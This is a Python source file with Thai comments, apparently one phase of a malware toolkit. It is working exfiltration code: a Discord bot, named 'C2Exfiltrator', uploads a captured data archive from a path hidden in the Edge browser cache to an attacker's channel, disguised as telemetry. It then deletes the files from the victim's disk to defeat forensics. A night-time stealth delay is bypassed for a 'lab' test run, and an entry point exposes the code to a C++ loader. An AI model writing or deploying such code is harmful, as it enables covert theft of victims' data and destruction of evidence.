# phase5_c2.py (เวอร์ชันสำหรับกดทดสอบในแล็บ - บันทึกเสร็จส่งของทันที)
import discord
import os
import asyncio
from datetime import datetime

# =========================================================================
# [ 🧼 💡 กลไกพรางตาพิกัดซ่อนเร้นลึก (Advanced Path Stealth Setup) ]
# =========================================================================
local_app_data = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
TARGET_DIR = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\Diagnostic_Packs")
ZIP_PATH = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\f_0000a6_idx.tmp")
# =========================================================================

class C2Exfiltrator(discord.Client):
    def __init__(self, channel_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_channel_id = channel_id

    async def on_ready(self):
        channel = self.get_channel(self.target_channel_id)
        if channel is None:
            await self.close()
            return
        
        # ส่งข้อความเปิดท่อสัญญาณแจ้งคุณทาง Discord ทันทีแบบพรางสายตา
        await channel.send(content="⚡ **[Lab Test Action] Telemetry data captured! Exfiltrating payload packet immediately...**")
        
        # 📦 ลำเลียงไฟล์มัดรวมหลักฐาน .tmp ที่พึ่งบันทึกเสร็จสดๆ ร้อนๆ ส่งขึ้น Discord C2 ของคุณ
        if os.path.exists(ZIP_PATH):
            try:
                with open(ZIP_PATH, 'rb') as f:
                    discord_file = discord.File(f, filename="ms_edge_telemetry_v14.dat")
                    await channel.send(content="📦 **[Exfiltration Connected] ลำเลียงชิ้นส่วนข้อมูลลับระบบประจำวันสำเร็จ:**", file=discord_file)
            except Exception as e:
                try: await channel.send(content=f"❌ *เกิดข้อผิดพลาดในการส่งไฟล์: {e}*")
                except: pass

        # 🧼 กลไกทำลายหลักฐานลบคม (Anti-Forensics) กวาดล้างเศษไฟล์บนดิสก์เครื่องเหยื่อทิ้งหมดจด
        try:
            if os.path.exists(ZIP_PATH): 
                os.remove(ZIP_PATH)
            if os.path.exists(TARGET_DIR):
                for file_name in os.listdir(TARGET_DIR):
                    os.remove(os.path.join(TARGET_DIR, file_name))
                os.rmdir(TARGET_DIR)
        except: pass
        
        await self.close()

async def wait_for_stealth_time():
    """⚠️ [Lab Override] ปรับจูนช่องทางให้ข้ามเวลาการรอนอนหลับของเหยื่อ เพื่อรันผลทดสอบทันทีหน้างาน"""
    print("[+] [Lab-Scheduler] บายพาสข้ามเงื่อนไขเวลาเที่ยงคืน สั่งยิงทราฟฟิก C2 ออกระบบทันที!")
    await asyncio.sleep(1) # หน่วงเวลาสั้นๆ 1 วินาทีพอเป็นพิธี แล้วปล่อยผ่านเลย
    return

# =========================================================================
# [ 🛠️ ประตูเชื่อมต่อเชื่อมสายข้ามมิติ - รองรับการเรียกสั่งจุดระเบิดจากฝั่ง C++ ]
# =========================================================================
def main_entry(token_str, channel_id_int):
    # วิ่งทะลุผ่านลูปหน่วงเวลาจำลองรวดเร็วข้ามคิวรอเวลาดึก
    asyncio.run(wait_for_stealth_time())
    
    intents = discord.Intents.all()
    client = C2Exfiltrator(channel_id=channel_id_int, intents=intents)
    client.run(token_str)
